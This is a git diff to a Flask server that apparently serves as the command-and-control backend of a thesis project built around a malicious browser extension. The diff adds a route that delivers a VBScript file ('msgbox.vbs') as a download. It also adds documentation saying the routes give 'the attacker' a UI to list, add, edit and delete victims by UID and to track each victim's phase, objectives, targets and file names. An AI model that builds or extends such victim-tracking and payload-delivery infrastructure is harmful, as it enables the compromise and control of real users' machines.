@@ -85,15 +85,45 @@ def req(uid):
     else:
         return jsonify(phase = rows[1], obj =  rows[2], tar = rows[3], nam = rows[4])
 
-    
+@app.route('/download')
+def downloadFile ():
+    #For windows you need to use drive name [ex: F:/Example.pdf]
+    path = __file__[:-6]+"Control\\files\\msgbox.vbs"
+    return flask.send_file(path, as_attachment=True)
+
+#https://stackoverflow.com/questions/24577349/flask-download-a-file
     
 #conda activate servers
 #flask --app C:\Users\migue\Documents\TFG\TFGExtension\Server\app run
 
 
-#https://stackoverflow.com/questions/67429333/flask-how-to-update-information-on-sqlite-based-on-button-input
-#DATABASE CONNECTION SYSTEM:
 
+"""
+DATABASE LOGIC:
+
+This functions and pages manages the creations, addition, edition and elimination 
+logic of the database.
+
+The database is a sqlite file in the /DB/ folder called test.sqlite, everything is 
+managed by the sqlite python module.
+
+This code is built from the basis presented in:
+https://stackoverflow.com/questions/67429333/flask-how-to-update-information-on-sqlite-based-on-button-input
+
+The logic make use of some html files present in /Control/templates/ for presenting a raw
+UI to the attacker.
+
+All Tables contains the uid of the victim.
+
+create_database is used in the {URL}/initizalize page
+
+route /list shows all UID, their phase and actual Objectives, Targets and File_Name
+route /add allows for adding manually UID
+route /extadd/<int:number> for the extesion to add information defined by the number
+route /edit allos for manually editing main table (modify objectives, tarjets and file_name)
+route /delete deletes wanted UID entry
+route /listByUid/<int:uid> Queries all information of a particular UID
+"""
 
 
 def create_database():
